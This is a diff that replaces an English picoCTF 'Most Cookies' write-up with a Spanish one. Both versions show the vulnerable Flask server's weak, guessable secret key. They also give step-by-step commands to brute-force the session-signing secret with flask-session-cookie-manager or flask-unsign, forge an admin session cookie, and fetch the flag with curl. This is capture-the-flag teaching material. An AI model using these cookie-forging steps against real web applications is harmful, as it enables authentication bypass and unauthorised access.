@@ -1,152 +1,97 @@
-
 # Most Cookies
 
+## Descripción
 
-### Description: 
-Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:52134/
+El servidor Flask elige aleatoriamente un secreto de una lista de 28 nombres de galletas para firmar los cookies de sesión. El objetivo es modificar el cookie para cambiar `very_auth` de `blank` a `admin` y acceder a la página que muestra el flag.
 
-### Solution:
-The challenge gives us a link which opens a webpage with a "session" cookie that we will most likely have to modify. Looking at the server.py sourcecode:
-```python
-from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
-import random
-app = Flask(__name__)
-flag_value = open("./flag").read().rstrip()
-title = "Most Cookies"
-cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
-app.secret_key = random.choice(cookie_names)
+## Solución
 
-@app.route("/")
-def main():
-	if session.get("very_auth"):
-		check = session["very_auth"]
-		if check == "blank":
-			return render_template("index.html", title=title)
-		else:
-			return make_response(redirect("/display"))
-	else:
-		resp = make_response(redirect("/"))
-		session["very_auth"] = "blank"
-		return resp
+### Paso 1: Obtener el cookie inicial
 
-@app.route("/search", methods=["GET", "POST"])
-def search():
-	if "name" in request.form and request.form["name"] in cookie_names:
-		resp = make_response(redirect("/display"))
-		session["very_auth"] = request.form["name"]
-		return resp
-	else:
-		message = "That doesn't appear to be a valid cookie."
-		category = "danger"
-		flash(message, category)
-		resp = make_response(redirect("/"))
-		session["very_auth"] = "blank"
-		return resp
-
-@app.route("/reset")
-def reset():
-	resp = make_response(redirect("/"))
-	session.pop("very_auth", None)
-	return resp
-
-@app.route("/display", methods=["GET"])
-def flag():
-	if session.get("very_auth"):
-		check = session["very_auth"]
-		if check == "admin":
-			resp = make_response(render_template("flag.html", value=flag_value, title=title))
-			return resp
-		flash("That is a cookie! Not very special though...", "success")
-		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
-	else:
-		resp = make_response(redirect("/"))
-		session["very_auth"] = "blank"
-		return resp
-
-if __name__ == "__main__":
-	app.run()
-```
-Here we see that we must set the "very_auth" portion of the session cookie to be equal to admin in order to log in. Using the handy python flask session cookie decoder script at
-https://github.com/noraj/flask-session-cookie-manager I decode the cookie as such:
-```
-zerodaytea@Patryk:/mnt/d/Coding/CTFs/PicoCTF2021/WebExploitation$ python3 flask-session-cookie-manager/flask_session_cookie_manager3.py decode -c "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YLAGPA.XMO3KTe4NKz9eLQPlKm6optk-Ao"
-b'{"very_auth":"blank"}'
-```
-Currently the value of the cookie is blank and we must re-encode it with the value of "'{"very_auth":"admin"}'" in order to get the flag. The only issue is that to re-encode the cookie
-we must use the proper secret key which is decided by this line in the server.py file:
-```python
-cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
-app.secret_key = random.choice(cookie_names)
-```
-Everytime the page is reloaded or accessed another secret key is chosen by random from the list of cookie names. By using the same script from before we can specify a secret key
-with the -s tag.
-```
-zerodaytea@Patryk:/mnt/d/Coding/CTFs/PicoCTF2021/WebExploitation$ python3 flask-session-cookie-manager/flask_session_cookie_manager3.py decode -c "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YLAGPA.XMO3KTe4NKz9eLQPlKm6optk-Ao" -s 'snickerdoodle'
-[Decoding error] Signature b'XMO3KTe4NKz9eLQPlKm6optk-Ao' does not match
-```
-When the wrong secret key is specified a "Decoding error" will be thrown by the script. Knowing that the secret key is one of the ones from the list we can keep trying them until
-we get the correct one. For me the correct secret key was "peanut butter":
-```
-zerodaytea@Patryk:/mnt/d/Coding/CTFs/PicoCTF2021/WebExploitation$ python3 flask-session-cookie-manager/flask_session_cookie_manager3.py decode -c "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YLAGPA.XMO3KTe4NKz9eLQPlKm6optk-Ao" -s 'peanut butter'
-{'very_auth': 'blank'}
-```
-Note that everytime you reload or access the page the cookie will look different because it is being signed with a different secret key. Make sure to not reload your page while working
-on this challenge. Knowing this now we can now sign a new cookie with the value of admin for "very_auth" as such:
-```
-zerodaytea@Patryk:/mnt/d/Coding/CTFs/PicoCTF2021/WebExploitation$ python3 flask-session-cookie-manager/flask_session_cookie_manager3.py encode -s "peanut butter" -t '{"very_auth":"admin"}'
-eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YLARpw.syqpGEhNTNk1s2iqLVEOH0QHnUA
-```
-Putting this new value into the session cookie back on the website http://mercury.picoctf.net:52134/display with a tool such as EditThisCookie for Chrome we get this contents 
-with the flag.
-```html
-
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <title>Most Cookies</title>
-
-
-    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
-
-    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">
-
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
-
-</head>
-
-<body>
-
-    <div class="container">
-        <div class="header">
-            <nav>
-                <ul class="nav nav-pills pull-right">
-                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Reset</a>
-                    </li>
-                </ul>
-            </nav>
-            <h3 class="text-muted">Most Cookies</h3>
-        </div>
-
-        <div class="jumbotron">
-            <p class="lead"></p>
-            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_478da04c}</code></p>
-        </div>
-
-
-        <footer class="footer">
-            <p>&copy; PicoCTF</p>
-        </footer>
-
-    </div>
-</body>
-
-</html>
+```bash
+curl -s -i http://wily-courier.picoctf.net:56988/ | grep -i "set-cookie"
 ```
 
-### Flag:
+Resultado: `session=eyJ2ZXJ5X2F1dGciOiJibGFuayJ9.agKZHg.MPr8jEox2J_mUImAwK11XKIWwXo`
+
+### Paso 2: Instalar flask-unsign
+
+```bash
+pip3 install flask-unsign
 ```
-picoCTF{pwn_4ll_th3_cook1E5_478da04c}
+
+### Paso 3: Crackear el secreto
+
+Crear wordlist de 28 nombres de galletas:
+
+```bash
+cat > /tmp/cookies.txt << 'EOFCOOKIE'
+snickerdoodle
+chocolate chip
+oatmeal raisin
+gingersnap
+shortbread
+peanut butter
+whoopie pie
+sugar
+molasses
+kiss
+biscotti
+butter
+spritz
+snowball
+drop
+thumbprint
+pinwheel
+wafer
+macaroon
+fortune
+crinkle
+icebox
+gingerbread
+tassie
+lebkuchen
+macaron
+black and white
+white chocolate macadamia
+EOFCOOKIE
 ```
+
+Crackear:
+
+```bash
+python3 -m flask_unsign --unsign --cookie "eyJ2ZXJ5X2F1dGciOiJibGFuayJ9.agKZHg.MPr8jEox2J_mUImAwK11XKIWwXo" --wordlist /tmp/cookies.txt
+```
+
+Resultado: `Found secret key after 28 attempts: 'macaroon'`
+
+### Paso 4: Firmar nuevo cookie con very_auth=admin
+
+**IMPORTANTE**: Usar flag `--legacy` para Flask antiguo:
+
+```bash
+python3 -m flask_unsign --sign --cookie "{'very_auth': 'admin'}" --secret "macaroon" --legacy
+```
+
+Resultado: `eyJ2ZXJ5X2F1dGciOiJhZG1pbiJ9.agKSDw.hDXCq4qStmPjdDnDXQUr92B6qXg`
+
+### Paso 5: Usar el nuevo cookie para obtener el flag
+
+```bash
+curl -s "http://wily-courier.picoctf.net:56988/display" \
+  -H "Cookie: session=eyJ2ZXJ5X2F1dGciOiJhZG1pbiJ9.agKSDw.hDXCq4qStmPjdDnDXQUr92B6qXg" | grep -o "picoCTF{[^}]*}"
+```
+
+Flag: `picoCTF{cO0ki3s_yum_b8a89e75}`
+
+## Notas
+
+- Cada instancia del servidor elige un secreto diferente aleatoriamente
+- El flag `--legacy` es crucial para Flask versiones antiguas - genera el timestamp correcto que el servidor acepta
+- Sin `--legacy`, el servidor redirige en lugar de mostrar el flag
+- No recargar la página durante el proceso o el secreto cambiará
+
+## Referencias
+
+- Flask session cookie signing: https://flask.palletsprojects.com/en/2.0.x/config/
+- flask-unsign tool: https://github.com/Paradoxis/Flask-Unsign
